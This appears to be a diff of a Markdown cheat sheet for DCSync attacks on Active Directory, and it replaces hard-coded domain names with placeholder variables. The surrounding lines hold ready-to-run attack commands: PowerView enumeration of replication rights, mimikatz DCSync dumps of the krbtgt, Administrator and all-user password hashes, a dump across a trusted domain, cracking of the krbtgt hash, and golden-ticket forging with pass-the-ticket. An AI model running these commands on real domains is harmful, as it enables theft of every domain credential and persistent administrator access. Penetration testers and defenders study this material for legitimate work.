@@ -20,7 +20,7 @@
 ### With PowerView
 
 ```powershell
-Get-ObjectAcl -DistinguishedName "DC=corp,DC=local" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "Replicating" }
+Get-ObjectAcl -DistinguishedName "$BASE_DN" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "Replicating" }
 ```
 
 ### With BloodHound
@@ -36,25 +36,25 @@ Find all principals with DCSync rights
 ### Dump `krbtgt` Hash
 
 ```mimikatz
-lsadump::dcsync /domain:corp.local /user:krbtgt
+lsadump::dcsync /domain:$DOMAIN /user:krbtgt
 ```
 
 ### Dump `Administrator` Hash
 
 ```mimikatz
-lsadump::dcsync /domain:corp.local /user:Administrator
+lsadump::dcsync /domain:$DOMAIN /user:Administrator
 ```
 
 ### Dump All Users (Heavy Noise)
 
 ```mimikatz
-lsadump::dcsync /domain:corp.local /all
+lsadump::dcsync /domain:$DOMAIN /all
 ```
 
 ### Dump Across Trusted Domain
 
 ```mimikatz
-lsadump::dcsync /domain:child.corp.local /user:svc_sql
+lsadump::dcsync /domain:child.$DOMAIN /user:svc_sql
 ```
 
 ---
@@ -90,7 +90,7 @@ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt krbtgt.hash
 
 ```powershell
 privilege::debug
-lsadump::dcsync /domain:corp.local /user:krbtgt
-kerberos::golden /krbtgt:<hash> /domain:corp.local /sid:S-1-5-21-xxx... /user:admin /ptt
+lsadump::dcsync /domain:$DOMAIN /user:krbtgt
+kerberos::golden /krbtgt:<hash> /domain:$DOMAIN /sid:S-1-5-21-xxx... /user:admin /ptt
 ```
 
